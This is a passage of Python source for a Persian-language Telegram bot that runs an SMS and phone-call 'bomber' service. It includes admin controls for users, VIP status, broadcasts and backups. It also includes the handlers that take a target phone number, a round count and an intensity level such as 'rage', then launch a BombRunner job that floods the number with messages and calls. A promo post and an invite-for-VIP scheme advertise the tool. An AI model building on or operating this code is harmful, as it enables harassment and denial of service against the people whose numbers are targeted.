            text=f"{icon} {u.get('first_name','?')[:15]} | {u['user_id']}",
            callback_data=f"uinfo:{u['user_id']}")])
    nav = []
    if page > 0:
        nav.append(bp("قبلی", f"ad:users_p:{page-1}"))
    if page < total_pages - 1:
        nav.append(bp("بعدی", f"ad:users_p:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([bp("جستجو", "ad:search")])
    rows.append([bd("بازگشت", "ad:panel")])
    try:
        await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except TelegramBadRequest:
        pass


async def _users_page_msg(m: Message, page: int):
    users = list(database.users.values())
    users.sort(key=lambda u: u.get("joined_at", ""), reverse=True)
    per_page = 8
    total_pages = max(1, (len(users) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    chunk = users[start:start + per_page]

    text = (
        f"<b>کاربران ({fmt_num(len(users))})</b>\n"
        f"صفحه {page+1}/{total_pages}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    rows = []
    for u in chunk:
        icon = "🔴" if u.get("is_banned") else ("💎" if u.get("is_vip") else "🟢")
        rows.append([InlineKeyboardButton(
            text=f"{icon} {u.get('first_name','?')[:15]} | {u['user_id']}",
            callback_data=f"uinfo:{u['user_id']}")])
    nav = []
    if page > 0:
        nav.append(bp("قبلی", f"ad:users_p:{page-1}"))
    if page < total_pages - 1:
        nav.append(bp("بعدی", f"ad:users_p:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([bp("جستجو", "ad:search")])
    rows.append([bd("بازگشت", "ad:panel")])
    await m.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@router.callback_query(F.data.startswith("ad:users_p:"))
async def ad_users_p(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    page = int(q.data.split(":")[2])
    await _users_page(q, page)


@router.callback_query(F.data.startswith("uinfo:"))
async def cb_uinfo(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    uid = int(q.data.split(":")[1])
    u = database.get(uid)
    if not u:
        await q.answer("پیدا نشد", show_alert=True)
        return

    badges = []
    if u.get("is_banned"): badges.append("بن 🔴")
    if u.get("is_vip"): badges.append("VIP 💎")
    badges.append("قوانین ✅" if u.get("rules_accepted") else "قوانین ❌")

    text = (
        "<b>اطلاعات کاربر</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"آیدی: <code>{u['user_id']}</code>\n"
        f"نام: <b>{u.get('first_name', '?')}</b>\n"
        f"یوزرنیم: @{u.get('username', '-')}\n"
        f"عضویت: <b>{fmt_date(u.get('joined_at', ''))}</b>\n"
        f"آخرین بازدید: <b>{fmt_date(u.get('last_seen', ''))}</b>\n\n"
        f"{' | '.join(badges)}\n\n"
        f"جاب‌ها: <b>{u.get('total_jobs', 0)}</b>\n"
        f"موفق: <b>{u.get('total_success', 0)}</b>\n"
        f"ناموفق: <b>{u.get('total_failed', 0)}</b>\n"
        f"دعوت‌ها: <b>{u.get('invite_count', 0)}</b>"
    )
    try:
        await q.message.edit_text(
            text,
            reply_markup=kb_user_manage(uid, u.get("is_banned", False), u.get("is_vip", False))
        )
    except TelegramBadRequest:
        pass


@router.callback_query(F.data.startswith("ban:"))
async def cb_ban(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split(":")[1])
    await database.set_banned(uid, True)
    await q.answer("بن شد")
    log.warning(f"{uid} banned by {q.from_user.id}")
    await cb_uinfo(q)


@router.callback_query(F.data.startswith("unban:"))
async def cb_unban(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split(":")[1])
    await database.set_banned(uid, False)
    await q.answer("آزاد شد")
    log.info(f"{uid} unbanned by {q.from_user.id}")
    await cb_uinfo(q)


@router.callback_query(F.data.startswith("givevip:"))
async def cb_givevip(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split(":")[1])
    await database.set_vip(uid, True)
    await q.answer("VIP داده شد")
    log.info(f"{uid} got VIP from {q.from_user.id}")
    await cb_uinfo(q)


@router.callback_query(F.data.startswith("unvip:"))
async def cb_unvip(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split(":")[1])
    await database.set_vip(uid, False)
    await q.answer("VIP حذف شد")
    log.info(f"{uid} VIP removed by {q.from_user.id}")
    await cb_uinfo(q)


@router.callback_query(F.data.startswith("del:"))
async def cb_del(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split(":")[1])
    if await database.delete_user(uid):
        await q.answer("کاربر حذف شد", show_alert=True)
        log.warning(f"{uid} deleted by {q.from_user.id}")
        await ad_users(q)
    else:
        await q.answer("پیدا نشد", show_alert=True)


@router.callback_query(F.data.startswith("msg:"))
async def cb_msg(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split(":")[1])
    await q.answer()
    await state.update_data(target_uid=uid)
    await q.message.edit_text(
        f"<b>پیام به <code>{uid}</code></b>\n\nمتن رو بفرست:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bd("لغو", "ad:panel")]
        ]),
    )
    await state.set_state(S.admin_msg_user)


@router.message(S.admin_msg_user)
async def on_admin_msg(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    data = await state.get_data()
    target = data.get("target_uid")
    if not target:
        await state.clear()
        return
    text = m.text or ""
    if not text:
        await m.answer("خالی")
        return
    try:
        await m.bot.send_message(target, f"<b>پیام از ادمین:</b>\n\n{text}")
        await m.answer(f"ارسال شد به <code>{target}</code>", reply_markup=kb_admin_panel())
    except Exception as e:
        await m.answer(f"خطا: {e}", reply_markup=kb_admin_panel())
    await state.clear()
    await state.set_state(S.menu)


@router.callback_query(F.data == "ad:vip")
async def ad_vip(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    vips = [u for u in database.users.values() if u.get("is_vip")]
    text = f"<b>VIP ها ({len(vips)})</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    if not vips:
        text += "هیچ کسی VIP نیست."
    else:
        for u in vips[:15]:
            text += f"💎 {u.get('first_name','?')[:15]} — <code>{u['user_id']}</code>\n"
    await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [bd("بازگشت", "ad:panel")],
    ]))


@router.callback_query(F.data == "ad:banned")
async def ad_banned(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    banned = [u for u in database.users.values() if u.get("is_banned")]
    text = f"<b>بن شده‌ها ({len(banned)})</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    rows = []
    if not banned:
        text += "لیست خالیه."
    else:
        for u in banned[:15]:
            rows.append([InlineKeyboardButton(
                text=f"🔴 {u.get('first_name','?')[:15]} | {u['user_id']}",
                callback_data=f"uinfo:{u['user_id']}")])
    rows.append([bd("بازگشت", "ad:panel")])
    await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@router.callback_query(F.data == "ad:active")
async def ad_active(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    if not ACTIVE:
        await q.message.edit_text("جاب فعالی نیست.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bd("بازگشت", "ad:panel")],
        ]))
        return
    text = "<b>جاب‌های فعال</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    rows = []
    for uid, r in ACTIVE.items():
        pct = int((r.rounds / r.count) * 100) if r.count else 0
        tag = " 👑" if r.is_admin else (" 💎" if r.is_vip else "")
        text += (
            f"<code>{uid}</code>{tag}\n"
            f"شماره: <code>{r.phone}</code>\n"
            f"<code>{progress_bar(pct)}</code> {pct}%\n"
            f"{r.rounds}/{r.count}\n"
            f"✅ {r.success} | ❌ {r.failed}\n\n"
        )
        rows.append([bd(f"توقف {uid}", f"admin_stop:{uid}")])
    rows.append([bd("توقف همه", "admin_stopall")])
    rows.append([bd("بازگشت", "ad:panel")])
    await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@router.callback_query(F.data.startswith("admin_stop:"))
async def cb_admin_stop(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split(":")[1])
    if uid in ACTIVE:
        ACTIVE[uid].stop()
        await q.answer(f"جاب {uid} متوقف شد", show_alert=True)
    else:
        await q.answer("جاب نیست", show_alert=True)


@router.callback_query(F.data == "admin_stopall")
async def cb_admin_stopall(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    count = len(ACTIVE)
    for runner in list(ACTIVE.values()):
        runner.stop()
    await q.answer(f"{count} جاب متوقف شد", show_alert=True)
    log.warning(f"STOP ALL by {q.from_user.id}")


@router.callback_query(F.data.startswith("bc:"))
async def bc_handler(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    action = q.data.split(":")[1]
    await q.answer()

    if action == "cancel":
        await q.message.edit_text("لغو شد.", reply_markup=kb_admin_panel())
        await state.clear()
        return

    await state.update_data(bc_target=action)
    target_fa = {"all": "همه", "vip": "فقط VIP", "active": "فقط فعال‌ها"}.get(action, "همه")
    await q.message.edit_text(
        f"<b>پیام همگانی — {target_fa}</b>\n\nمتن پیام رو بفرست:",
    )
    await state.set_state(S.admin_broadcast_text)


@router.message(S.admin_broadcast_text)
async def on_bc_text(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    text = m.text or ""
    if not text:
        await m.answer("خالی")
        return
    data = await state.get_data()
    target = data.get("bc_target", "all")

    all_users = list(database.users.values())
    if target == "vip":
        recipients = [u for u in all_users if u.get("is_vip") and not u.get("is_banned")]
    elif target == "active":
        recipients = [u for u in all_users if u.get("total_jobs", 0) > 0 and not u.get("is_banned")]
    else:
        recipients = [u for u in all_users if not u.get("is_banned")]

    status = await m.answer(f"شروع ارسال به {len(recipients)} نفر...")
    sent, fail = 0, 0
    for u in recipients:
        try:
            await m.bot.send_message(u["user_id"], text)
            sent += 1
            if sent % 25 == 0:
                try:
                    pct = int((sent / len(recipients)) * 100) if recipients else 0
                    await status.edit_text(
                        f"در حال ارسال...\n"
                        f"<code>{progress_bar(pct)}</code> {pct}%\n"
                        f"ارسال: {sent} | ناموفق: {fail}"
                    )
                except Exception:
                    pass
            await asyncio.sleep(0.05)
        except (TelegramForbiddenError, TelegramBadRequest):
            fail += 1
        except Exception:
            fail += 1
    await status.edit_text(
        f"ارسال تموم شد.\n\n"
        f"موفق: <b>{sent}</b>\nناموفق: <b>{fail}</b>",
        reply_markup=kb_admin_panel(),
    )
    log.info(f"broadcast ({target}): {sent} sent, {fail} failed")
    await state.clear()
    await state.set_state(S.menu)


@router.callback_query(F.data == "ad:search")
async def ad_search(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    await q.message.edit_text("<b>جستجو</b>\n\nآیدی/یوزرنیم/نام رو بفرست:")
    await state.set_state(S.admin_search)


@router.message(S.admin_search)
async def on_search(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    q = (m.text or "").strip().lower()
    if not q:
        await m.answer("خالی")
        return
    results = []
    for u in database.users.values():
        if (q in str(u.get("user_id", "")) or
                q in (u.get("username", "") or "").lower() or
                q in (u.get("first_name", "") or "").lower()):
            results.append(u)
        if len(results) >= 10:
            break
    if not results:
        await m.answer("چیزی پیدا نشد.", reply_markup=kb_admin_panel())
        await state.clear()
        await state.set_state(S.menu)
        return
    rows = []
    for u in results:
        icon = "🔴" if u.get("is_banned") else ("💎" if u.get("is_vip") else "🟢")
        rows.append([InlineKeyboardButton(
            text=f"{icon} {u.get('first_name','?')[:15]} | {u['user_id']}",
            callback_data=f"uinfo:{u['user_id']}")])
    rows.append([bd("بازگشت", "ad:panel")])
    await m.answer(
        f"<b>نتایج ({len(results)})</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
    )
    await state.clear()
    await state.set_state(S.menu)


@router.callback_query(F.data == "ad:settings")
async def ad_settings(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    await q.message.edit_text("<b>تنظیمات</b>", reply_markup=kb_admin_settings())


@router.callback_query(F.data == "ad:toggle_join")
async def ad_toggle_join(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    cur = database.config.get("force_join_enabled", False)
    await database.set_config(force_join_enabled=not cur)
    await q.answer("فعال شد" if not cur else "غیرفعال شد")
    await q.message.edit_text("<b>تنظیمات</b>", reply_markup=kb_admin_settings())


@router.callback_query(F.data == "ad:toggle_maint")
async def ad_toggle_maint(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    cur = database.config.get("maintenance", False)
    await database.set_config(maintenance=not cur)
    await q.answer("تعمیر روشن" if not cur else "خاموش شد")
    await q.message.edit_text("<b>تنظیمات</b>", reply_markup=kb_admin_settings())


@router.callback_query(F.data == "ad:set_link")
async def ad_set_link(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    await q.message.edit_text(
        "<b>تنظیم کانال</b>\n\n"
        "فرمت:\n<code>@channel|https://t.me/channel</code>\n"
        "یا:\n<code>-100xxx|https://t.me/+abc</code>",
    )
    await state.set_state(S.set_channel)


@router.message(S.set_channel)
async def on_set_channel(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    text = (m.text or "").strip()
    if "|" not in text:
        await m.answer("فرمت اشتباهه.")
        return
    ch, link = text.split("|", 1)
    ch = ch.strip()
    link = link.strip()
    ch_id = 0
    if ch.startswith("-100") and ch[1:].isdigit():
        ch_id = int(ch)
    elif ch.startswith("@"):
        try:
            chat = await m.bot.get_chat(ch)
            ch_id = chat.id
        except Exception as e:
            await m.answer(f"خطا: {e}")
            return
    else:
        await m.answer("فرمت درست نیست.")
        return
    await database.set_config(
        force_join_channel=ch,
        force_join_channel_id=ch_id,
        force_join_link=link,
    )
    await m.answer(f"کانال تنظیم شد.\n\n{ch}\nID: {ch_id}", reply_markup=kb_admin_panel())
    log.info(f"channel set: {ch} ({ch_id})")
    await state.clear()
    await state.set_state(S.menu)


@router.callback_query(F.data == "ad:channel")
async def ad_channel(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    cfg = database.config
    await q.message.edit_text(
        "<b>مدیریت کانال</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"کانال: <code>{cfg.get('force_join_channel', '-')}</code>\n"
        f"ID: <code>{cfg.get('force_join_channel_id', '-')}</code>\n"
        f"لینک: {cfg.get('force_join_link', '-')}\n"
        f"وضعیت: {'فعال 🟢' if cfg.get('force_join_enabled') else 'غیرفعال 🔴'}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bp("تنظیم کانال", "ad:set_link")],
            [bp("ارسال پست", "ad:post")],
            [bs("ارسال لینک ربات", "ad:send_bot_link")],
            [bd("بازگشت", "ad:panel")],
        ]),
    )


@router.callback_query(F.data == "ad:send_bot_link")
async def ad_send_bot_link(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    cfg = database.config
    if not cfg.get("force_join_channel_id"):
        await q.answer("اول کانال رو تنظیم کن", show_alert=True)
        return
    me = await q.bot.get_me()
    text = (
        "🌵 <b>B2</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "یه ربات قدرتمند برای پیامک و تماس.\n\n"
        "• ممبر پیامک\n"
        "• ممبر تماس\n"
        "• حالت ترکیبی و رگباری\n"
        "• VIP رایگان با 10 دعوت\n\n"
        "👇 برای شروع:"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [bs("ورود به ربات", url=f"https://t.me/{me.username}")],
        [bp("کانال ما", url=cfg.get("force_join_link") or f"https://t.me/{me.username}")],
    ])
    try:
        await q.bot.send_message(cfg.get("force_join_channel_id"), text,
                                 reply_markup=kb, disable_web_page_preview=True)
        await q.answer("ارسال شد", show_alert=True)
    except Exception as e:
        await q.answer(f"خطا: {e}", show_alert=True)


@router.callback_query(F.data == "ad:bot_info")
async def ad_bot_info(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    me = await q.bot.get_me()
    s = database.stats
    await q.message.edit_text(
        "<b>اطلاعات ربات</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"یوزرنیم: @{me.username}\n"
        f"ID: <code>{me.id}</code>\n"
        f"نام: {me.first_name}\n"
        f"جاب‌ها: {fmt_num(s['total_jobs'])}\n"
        f"ادمین‌ها: {len(ADMIN_IDS)}\n"
        f"VIP: {s.get('vip_count', 0)}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bd("بازگشت", "ad:settings")],
        ]),
    )


@router.callback_query(F.data == "ad:invites")
async def ad_invites(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    users = sorted(database.users.values(), key=lambda x: x.get("invite_count", 0), reverse=True)
    top = users[:10]
    text = "<b>Top 10 دعوت‌کننده</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, u in enumerate(top, 1):
        if u.get("invite_count", 0) == 0:
            break
        text += f"{i}. {u.get('first_name','?')[:15]} — <b>{u.get('invite_count', 0)}</b>\n"
    if text.endswith("━━━\n\n"):
        text += "هیچ دعوتی ثبت نشده."
    await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [bd("بازگشت", "ad:panel")],
    ]))


@router.callback_query(F.data == "ad:backup")
async def ad_backup(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer("در حال ساخت...")
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup = {
            "users": database.users,
            "jobs": database.jobs,
            "stats": database.stats,
            "config": database.config,
            "created_at": datetime.now().isoformat(),
        }
        path = BACKUP_DIR / f"backup_{ts}.json"
        with open(path, "w", encoding="utf-8") as f:
            json.dump(backup, f, ensure_ascii=False, indent=2)
        size = path.stat().st_size
        await q.message.edit_text(
            "<b>پشتیبان ساخته شد</b>\n\n"
            f"فایل: <code>{path.name}</code>\n"
            f"حجم: {size/1024:.1f} KB\n"
            f"کاربران: {len(database.users)}\n"
            f"جاب‌ها: {len(database.jobs)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [bd("بازگشت", "ad:panel")],
            ]),
        )
    except Exception as e:
        await q.message.edit_text(f"خطا: {e}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bd("بازگشت", "ad:panel")],
        ]))


@router.callback_query(F.data == "ad:cleanup")
async def ad_cleanup(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    await q.message.edit_text(
        "<b>پاک‌سازی</b>\n\nیکی رو انتخاب کن:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [bd("کاربران بدون قوانین (قدیمی)", "ad:cleanup_rules")],
            [bd("کاربران غیرفعال (30 روز)", "ad:cleanup_inactive")],
            [bd("جاب‌های قدیمی", "ad:cleanup_jobs")],
            [bd("بازگشت", "ad:panel")],
        ]),
    )


@router.callback_query(F.data == "ad:cleanup_rules")
async def ad_cleanup_rules(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    count = 0
    for uid, u in list(database.users.items()):
        if not u.get("rules_accepted") and not u.get("is_vip"):
            try:
                joined = datetime.fromisoformat(u.get("joined_at", ""))
                if (datetime.now() - joined).days >= 7:
                    del database.users[uid]
                    count += 1
            except Exception:
                pass
    await database._save("users")
    await q.message.edit_text(f"{count} کاربر پاک شد.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [bd("بازگشت", "ad:panel")],
    ]))


@router.callback_query(F.data == "ad:cleanup_inactive")
async def ad_cleanup_inactive(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    count = 0
    cutoff = datetime.now() - timedelta(days=30)
    for uid, u in list(database.users.items()):
        try:
            last = datetime.fromisoformat(u.get("last_seen", u.get("joined_at", "")))
            if last < cutoff and not u.get("is_vip"):
                del database.users[uid]
                count += 1
        except Exception:
            pass
    await database._save("users")
    await q.message.edit_text(f"{count} کاربر غیرفعال پاک شد.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [bd("بازگشت", "ad:panel")],
    ]))


@router.callback_query(F.data == "ad:cleanup_jobs")
async def ad_cleanup_jobs(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    count = 0
    cutoff = datetime.now() - timedelta(days=7)
    for jid, j in list(database.jobs.items()):
        if j.get("status") in ("done", "stopped"):
            try:
                finished = datetime.fromisoformat(j.get("finished_at", ""))
                if finished < cutoff:
                    del database.jobs[jid]
                    count += 1
            except Exception:
                pass
    await database._save("jobs")
    await q.message.edit_text(f"{count} جاب پاک شد.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [bd("بازگشت", "ad:panel")],
    ]))


@router.callback_query(F.data == "ad:post")
async def ad_post(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    cfg = database.config
    if not cfg.get("force_join_channel_id"):
        await q.answer("اول کانال رو تنظیم کن", show_alert=True)
        return
    await q.message.edit_text("<b>ساخت پست</b>\n\nمتن پست رو بفرست:")
    await state.set_state(S.post_text)


@router.message(S.post_text)
async def on_post_text(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    text = m.text or ""
    if not text:
        await m.answer("خالی")
        return
    await state.update_data(post_text=text)
    await m.answer(
        "متن ذخیره شد.\n\n"
        "اگه دکمه‌ای می‌خوای، اینطوری بفرست:\n"
        "<code>متن دکمه|https://link</code>\n\n"
        "وگرنه /skip بزن",
    )
    await state.set_state(S.post_button_url)


@router.message(S.post_button_url)
async def on_post_url(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    text = (m.text or "").strip()
    data = await state.get_data()
    post_text = data.get("post_text", "")

    cfg = database.config
    ch_id = cfg.get("force_join_channel_id")

    kb = None
    if text and text != "/skip":
        if "|" not in text:
            await m.answer("فرمت اشتباه. مثال: <code>متن|https://link</code>\nیا /skip")
            return
        btn_text, url = text.split("|", 1)
        btn_text = btn_text.strip()
        url = url.strip()
        if not (url.startswith("http") or url.startswith("tg://")):
            await m.answer("لینک نامعتبر")
            return
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=btn_text, url=url)]
        ])

    try:
        await m.bot.send_message(ch_id, post_text, reply_markup=kb,
                                 disable_web_page_preview=True)
        await m.answer("پست ارسال شد.", reply_markup=kb_admin_panel())
        log.info(f"post sent to {ch_id}")
    except Exception as e:
        await m.answer(f"خطا: {e}", reply_markup=kb_admin_panel())
    await state.clear()
    await state.set_state(S.menu)


@router.callback_query(F.data == "ad:back_menu")
async def ad_back_menu(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    try:
        await q.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass
    await q.message.answer("منوی ادمین:", reply_markup=kb_admin_menu())
    await state.set_state(S.menu)


# ============================================================
#                    PHONE / COUNT INPUT
# ============================================================
@router.message(S.phone, F.text)
async def on_phone(m: Message, state: FSMContext):
    text = (m.text or "").strip()
    if not valid_phone(text):
        await m.answer("شماره اشتباهه. مثل: <code>09123456789</code>",
                       reply_markup=kb_cancel())
        return
    phone = norm(text)
    is_admin = m.from_user.id in ADMIN_IDS

    if is_forbidden(phone) and not is_admin:
        await database.log_blocked(m.from_user.id)
        await m.answer("این شماره محافظت‌شده‌ست.", reply_markup=kb_user_menu())
        await state.clear()
        await state.set_state(S.menu)
        return

    data = await state.get_data()
    intensity = data.get("intensity", "normal")
    preset = INTENSITY.get(intensity, INTENSITY["normal"])
    max_count = MAX_PER_JOB_ADMIN if is_admin else MAX_PER_JOB

    await state.update_data(phone=phone)
    await m.answer(
        f"شماره: <code>{phone}</code>\n\n"
        f"شدت: {preset['emoji']} {preset['label']}\n\n"
        f"چند راند بزنم؟ (1 تا {fmt_num(max_count)})",
        reply_markup=kb_cancel(),
    )
    await state.set_state(S.count)


@router.message(S.count, F.text)
async def on_count(m: Message, state: FSMContext):
    text = (m.text or "").strip()
    if not text.isdigit():
        await m.answer("فقط عدد بفرست.", reply_markup=kb_cancel())
        return
    count = int(text)
    is_admin = m.from_user.id in ADMIN_IDS
    max_count = MAX_PER_JOB_ADMIN if is_admin else MAX_PER_JOB

    if not (1 <= count <= max_count):
        await m.answer(f"بین 1 و {fmt_num(max_count)}.", reply_markup=kb_cancel())
        return

    data = await state.get_data()
    phone = data.get("phone")
    mode = data.get("mode", "sms")
    intensity = data.get("intensity", "normal")
    if not phone:
        await m.answer("مشکل پیش اومد. /start رو بزن.")
        await state.clear()
        return

    if is_forbidden(phone) and not is_admin:
        await database.log_blocked(m.from_user.id)
        await m.answer("این شماره مسدوده.", reply_markup=kb_user_menu())
        await state.clear()
        await state.set_state(S.menu)
        return

    uid = m.from_user.id
    is_vip = database.is_vip(uid)
    preset = INTENSITY.get(intensity, INTENSITY["normal"])
    mode_fa = {"sms": "پیامک", "call": "تماس", "both": "ترکیبی"}.get(mode, "ترکیبی")
    LAST_JOB[uid] = time.time()

    if intensity == "rage" and not is_admin:
        await database.inc_rage(uid)

    jid = await database.create_job(uid, phone, mode, count, intensity,
                                     is_admin_job=is_admin)

    tags = []
    if is_admin: tags.append("👑")
    elif is_vip: tags.append("💎")
    tag_str = " " + " ".join(tags) if tags else ""

    status_msg = await m.answer(
        f"<b>شروع شد{tag_str}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"شماره: <code>{phone}</code>\n"
        f"حالت: {mode_fa}\n"
        f"شدت: {preset['emoji']} {preset['label']}\n"
        f"تعداد: {count} راند\n"
        f"کد: #{jid[-8:]}\n\n"
        "در حال اجرا...",
        reply_markup=kb_stop(jid),
    )

    last_edit = {"t": 0.0}
    spinner = ["⏳", "⌛️", "⏱", "⏲"]

    async def on_progress(rounds, total, succ, fail):
        now = time.time()
        if now - last_edit["t"] < 2.0 and rounds != total:
            return
        last_edit["t"] = now
        pct = int((rounds / total) * 100) if total else 0
        bar = progress_bar(pct)
        sp = spinner[rounds % len(spinner)]
        try:
            await status_msg.edit_text(
                f"{sp} <b>در حال اجرا{tag_str}</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"شماره: <code>{phone}</code>\n"
                f"کد: #{jid[-8:]}\n"
                f"شدت: {preset['emoji']} {preset['label']}\n\n"
                f"<code>{bar}</code> {pct}%\n"
                f"{rounds}/{total}\n"
                f"✅ {succ} | ❌ {fail}",
                reply_markup=kb_stop(jid),
            )
        except TelegramBadRequest:
            pass
        except Exception:
            pass

    runner = BombRunner(phone, count, mode, jid, intensity=intensity,
                        is_vip=is_vip, is_admin=is_admin,
                        on_progress=on_progress)
    ACTIVE[uid] = runner

    try:
        await m.bot.send_chat_action(m.chat.id, ChatAction.TYPING)
        result = await runner.run()
    except Exception as e:
        log.exception(f"runner error: {e}")
        result = {"rounds": runner.rounds, "success": runner.success,
                  "failed": runner.failed, "stopped": True}
    finally:
        ACTIVE.pop(uid, None)

    await database.finish_job(jid, result["success"], result["failed"],
                              result["rounds"],
                              "stopped" if result["stopped"] else "done")

    icon = "🛑" if result["stopped"] else "✅"
    txt = "متوقف شد" if result["stopped"] else "تموم شد"
    try:
        await status_msg.edit_text(
            f"{icon} <b>{txt}{tag_str}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"شماره: <code>{phone}</code>\n"
            f"کد: #{jid[-8:]}\n"
            f"شدت: {preset['emoji']} {preset['label']}\n\n"
            f"راند: {result['rounds']}/{count}\n"
            f"موفق: {result['success']} | ناموفق: {result['failed']}"
        )
    except Exception:
        pass

    kb = kb_admin_menu() if is_admin else kb_user_menu()
    await m.answer("منو:", reply_markup=kb)
    await state.clear()
    await state.set_state(S.menu)


# ============================================================
#                    FALLBACKS
# ============================================================
@router.message(S.menu)
async def fallback_menu(m: Message, state: FSMContext):
    if m.text and m.text.startswith("/"):
        return
    is_admin = m.from_user.id in ADMIN_IDS
    kb = kb_admin_menu() if is_admin else kb_user_menu()
    await m.answer("از دکمه‌های منو استفاده کن.", reply_markup=kb)


@router.message(S.intensity)
async def fallback_intensity(m: Message, state: FSMContext):
    await m.answer("یه شدت انتخاب کن یا لغو کن.", reply_markup=kb_intensity())


# ============================================================
#                    MAIN
# ============================================================
async def set_commands(bot: Bot):
    try:
        await bot.set_my_commands([
            BotCommand(command="start", description="شروع"),
            BotCommand(command="help", description="راهنما"),
            BotCommand(command="myid", description="آیدی من"),
            BotCommand(command="cancel", description="لغو"),
        ], scope=BotCommandScopeDefault())
        log.info("commands set")
    except Exception as e:
        log.warning(f"commands: {e}")


async def main_async():
    banner()

    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        log.critical("BOT_TOKEN is not set!")
        sys.exit(1)

    log.info(f"bot: {BOT_NAME}")
    log.info(f"admins: {ADMIN_IDS}")
    log.info(f"proxy: {PROXY_URL or 'none'}")
    log.info("rules: forced for everyone")

    if PROXY_URL:
        session = AiohttpSession(proxy=PROXY_URL)
    else:
        session = AiohttpSession()
        log.warning("running without proxy")

    bot = Bot(
